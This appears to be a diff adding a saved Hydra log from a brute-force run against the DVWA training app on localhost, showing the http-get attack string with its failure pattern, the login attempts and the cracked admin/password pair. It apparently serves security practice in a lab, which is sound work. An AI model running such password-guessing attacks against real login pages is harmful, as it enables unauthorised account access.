@@ -1,0 +1,13 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-27 21:57:04
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task
+[DATA] attacking http-get://localhost:4280/dvwa/vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login:F=Username+and/or+password+incorrect
+[ATTEMPT] target localhost - login "admin" - pass "password" - 1 of 9 [child 0] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "charley" - 2 of 9 [child 1] (0/0)
+[ATTEMPT] target localhost - login "admin" - pass "wordpass" - 3 of 9 [child 2] (0/0)
+[ATTEMPT] target localhost - login "user" - pass "password" - 4 of 9 [child 3] (0/0)
+[4280][http-get] host: localhost   login: admin   password: password
+[STATUS] attack finished for localhost (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-27 21:57:04
